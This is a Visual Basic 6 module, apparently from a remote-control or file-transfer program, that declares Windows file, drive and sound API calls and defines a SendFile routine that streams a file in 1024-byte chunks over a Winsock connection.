Attribute VB_Name = "Module1"
Public Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Public Const SND_ASYNC = &H1
Public status As String
Public bFileTransfer As Boolean
Public lFileSize As Long
Public bGettingDesktop As Boolean
Public Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long

 ''''''''''
Global LastX As Integer
Global LastY As Integer


Global TransBuff As String

Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
Declare Function FindFirstFile Lib "kernel32" Alias "FindFirstFileA" (ByVal lpFileName As String, lpFindFileData As WIN32_FIND_DATA) As Long
Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

Declare Function FindNextFile Lib "kernel32" Alias "FindNextFileA" (ByVal hFindFile As Long, lpFindFileData As WIN32_FIND_DATA) As Long
Declare Function FindClose Lib "kernel32" (ByVal hFindFile As Long) As Long

Global Const SW_SHOWNORMAL = 1

 Public Const DRIVE_CDROM = 5
Public Const DRIVE_FIXED = 3
Public Const DRIVE_RAMDISK = 6
Public Const DRIVE_REMOTE = 4
Public Const DRIVE_REMOVABLE = 2
Public Const vbAllFileSpec = "*.*"

Public Const MAX_PATH = 260

Public Type FILETIME
  dwLowDateTime As Long
  dwHighDateTime As Long
End Type
Dim hFind As Long

Public Type WIN32_FIND_DATA
  dwFileAttributes As Long
  ftCreationTime As FILETIME
  ftLastAccessTime As FILETIME
  ftLastWriteTime As FILETIME
  nFileSizeHigh As Long
  nFileSizeLow As Long
  dwReserved0 As Long
  dwReserved1 As Long
  cFileName As String * MAX_PATH
  cShortFileName As String * 14
End Type

Public wfd As WIN32_FIND_DATA
Public Const INVALID_HANDLE_VALUE = -1

Public lNodeCount As Long

Public Const vbBackslash = "\"
Public Const vbAscDot = 46


Public Sub SendFile(FileName As String, WinS As Winsock)
On Error Resume Next
Dim FreeF As Integer
Dim LenFile As Long
Dim nCnt As Long
Dim LocData As String
Dim LoopTimes As Long
Dim i As Long
FreeF = FreeFile
Open FileName For Binary As #99
nCnt = 1
LenFile = LOF(99)
WinS.SendData "|FILESIZE|" & LenFile
DoEvents
Sleep (400)
Do Until nCnt >= (LenFile)
LocData = Space$(1024)
Get #99, nCnt, LocData
If nCnt + 1024 > LenFile Then
WinS.SendData Mid$(LocData, 1, (LenFile - nCnt))
Else
WinS.SendData LocData
End If
nCnt = nCnt + 1024
Loop
Close #99
End Sub







